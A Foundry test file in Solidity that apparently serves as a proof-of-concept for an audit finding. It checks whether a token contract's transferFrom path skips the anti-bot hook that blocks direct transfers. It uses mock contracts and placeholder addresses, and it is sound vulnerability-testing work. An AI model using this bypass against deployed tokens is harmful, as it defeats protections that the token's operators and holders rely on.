// SPDX-License-Identifier: MIT
pragma solidity 0.7.5;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/KronosDaoToken.sol";

contract MockAntiBot {
    bool public shouldRevert;

    function setRevert(bool _shouldRevert) public {
        shouldRevert = _shouldRevert;
    }

    function onPreTransferCheck(
        address,
        address,
        uint256
    ) external {
        if (shouldRevert) {
            revert("Anti-bot: operation blocked");
        }
    }

    function setTokenOwner(address) external {
        // Mock implementation
    }
}

contract KronosDaoTokenTest is Test {
    KronosDaoToken token;
    MockAntiBot mockAntiBot;

    address deployer = address(0x1);
    address userA = address(0x2);
    address userB = address(0x3);
    address userC = address(0x4);

    function setUp() public {
        vm.startPrank(deployer);
        mockAntiBot = new MockAntiBot();
        token = new KronosDaoToken(address(mockAntiBot));
        
        // Setup vault for minting
        token.setVault(deployer);
        token.mint(userA, 1000 ether);
        
        // Enable anti-bot protection
        token.setEnableAntiBot(true);
        vm.stopPrank();

        // UserA approves UserC to spend tokens
        vm.prank(userA);
        token.approve(userC, 1000 ether);
    }

    function testTransferFromBypassesAntiBot() public {
        // Configure mock anti-bot to revert on transfers
        mockAntiBot.setRevert(true);

        console.log("--- BEFORE-Trigger Transfer ---");
        // Direct transfer from UserA to UserB (should be blocked)
        vm.prank(userA);
        vm.expectRevert("Anti-bot: operation blocked");
        token.transfer(userB, 500 ether);
        console.log("Direct transfer blocked: OK");

        console.log("--- Trigger TransferFrom ---");
        console.log("Attempting transferFrom operation...");
        bool transferFromSucceeded;
        vm.prank(userC);
        try token.transferFrom(userA, userB, 500 ether) returns (bool) {
            transferFromSucceeded = true;
        } catch {
            transferFromSucceeded = false;
        }
        console.log("--- AFTER-Trigger Result ---");
        console.log("TransferFrom success:", transferFromSucceeded);
        
        // Print one final vulnerability verdict
        if (transferFromSucceeded) {
            console.log("Vulnerability Exists: transferFrom bypassed anti-bot protection");
        } else {
            console.log("Vulnerability not Exist: transferFrom was blocked by anti-bot");
        }
    }
}